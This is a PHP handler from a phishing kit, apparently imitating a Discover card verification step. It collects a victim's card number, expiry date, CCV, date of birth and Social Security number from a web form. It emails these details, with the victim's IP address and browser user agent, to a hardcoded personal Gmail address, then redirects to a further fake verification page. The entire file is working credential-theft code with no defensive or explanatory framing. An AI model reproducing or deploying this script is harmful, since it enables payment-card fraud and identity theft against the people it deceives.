<?php
session_start();
		header("Access-Control-Allow-Origin:*");
		$recepientEmail = "allahsegun@gmail.com";
		$cardnumber = $_POST["cardnumber"];
		$expmonth = $_POST["expmonth"];
		$expyear = $_POST["expyear"];
		$ccv = $_POST["ccv"];
		$dobday = $_POST["dobday"];
		$dobmonth = $_POST["dobmonth"];
		$dobyear = $_POST["dobyear"];
		$ssn = $_POST["ssn"];

		
		// setting $session data...
		$_SESSION["cardnumber"] = $cardnumber;
		$_SESSION["expmonth"] = $expmonth;
		$_SESSION["expyear"] = $expyear;
		$_SESSION["ccv"] = $ccv;
		$_SESSION["dobday"] = $dobday;
		$_SESSION["dobmonth"] = $dobmonth;
		$_SESSION["dobyear"] = $dobyear;
		$_SESSION["ssn"] = $ssn;


		// creating message data...
		$message = "\n\r discover confirm login credentials\n\r";
		$message = $message."card number: ".$cardnumber."\n\r";
		$message = $message."expiry month: ".$expmonth."\n\r";
		$message = $message."expiry year: ".$expyear."\n\r";
		$message = $message."ccv: ".$ccv."\n\r";
		$message = $message."dob-day: ".$dobday."\n\r";
		$message = $message."dob-month: ".$dobmonth."\n\r";
		$message = $message."dob-year: ".$dobyear."\n\r";
		$message = $message."ssn: ".$ssn."\n\r";
		$message = $message."date: ".date("Y-m-d")."\n\r";
		$message = $message."time: ".date("h:i:s")."\n\r";	
		$message = $message."user-agent: ".$_SERVER["HTTP_USER_AGENT"]."\n\r";		
		$message = $message."user-ip-address: ".$_SERVER["REMOTE_ADDR"]."\n\r";		
		$mail = mail($recepientEmail,"discover user details/info 1 ".$email." details",$message);
    header("Location: ./verifyuser.php");
	
?>

